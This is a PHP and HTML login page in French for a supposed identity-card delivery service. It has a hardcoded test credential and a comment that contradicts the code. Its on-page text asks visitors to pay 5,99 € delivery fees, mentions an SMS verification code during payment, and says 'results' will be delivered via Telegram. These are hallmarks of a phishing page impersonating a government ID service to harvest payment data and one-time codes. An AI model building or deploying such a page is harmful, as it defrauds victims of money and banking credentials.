<?phpsession_start();

$error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email    = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';

    // Simple validation (extend as needed)
    if (empty($email) || empty($password)) {
        $error = 'Veuillez renseigner votre adresse e‑mail et votre mot de passe.';
    } else {
        // TODO: Replace with real user verification (e.g., database lookup)
        // For demonstration, accept any non‑empty credentials
        if ($email === 'user@example.com' && $password === 'password123') {
            // Login successful
            $_SESSION['user_email'] = $email;
            header('Location: dashboard.php');
            exit;
        } else {
            $error = 'E‑mail ou mot de passe incorrect.';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion – Service de livraison de carte d’identité</title>
    <style>
        body {font-family: Arial, sans-serif; background:#f5f5f5; margin:0; padding:20px;}
        .container {max-width: 400px; margin:auto; background:#fff; padding:20px; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,.1);}
        h1 {text-align:center; color:#2c3e50;}
        label {display:block; margin-top:15px;}
        input[type=email], input[type=password] {width:100%; padding:10px; margin-top:5px; border:1px solid #ccc; border-radius:4px;}
        button {margin-top:20px; width:100%; padding:10px; background:#27ae60; color:#fff; border:none; border-radius:4px; cursor:pointer;}
        button:hover {background:#219150;}
        .error {color:#e74c3c; margin-bottom:15px;}
        .info {font-size:0.9em; color:#555; margin-top:15px; text-align:center;}
    </style>
</head>
<body>
<div class="container">
    <h1>Connexion</h1>

    <?php if ($error): ?>
        <div class="error"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <form method="post" action="">
        <label for="email">Adresse e‑mail</label>
        <input type="email" id="email" name="email" placeholder="exemple@domaine.com" required autofocus>

        <label for="password">Mot de passe</label>
        <input type="password" id="password" name="password" placeholder="••••••••" required>

        <button type="submit">Se connecter</button>
    </form>

    <div class="info">
        <p>Vous devez régler <strong>5,99 €</strong> de frais de livraison pour recevoir votre carte d’identité.</p>
        <p>Un SMS contenant un code de vérification vous sera envoyé pendant le paiement.</p>
        <p>Une fois le paiement effectué, un courrier vous sera envoyé par e‑mail et les résultats seront accessibles via Telegram.</p>
    </div>
</div>
</body>
</html>